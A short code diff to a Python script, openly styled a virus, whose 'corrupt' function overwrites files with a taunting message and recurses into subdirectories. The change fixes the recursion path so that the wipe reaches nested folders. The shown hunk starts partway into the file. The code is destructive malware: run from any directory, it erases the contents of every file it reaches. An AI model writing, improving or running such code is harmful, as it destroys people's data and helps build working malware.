@@ -5,7 +5,7 @@ def corrupt(folder=""):
         try:
             with open(file, "w+") as f:
                 f.write("Hahahahaha. This is virus.")
-        except: corrupt(folder=file)
+        except: corrupt(folder=file+"/")
 
 for file in glob("*"):
     corrupt()
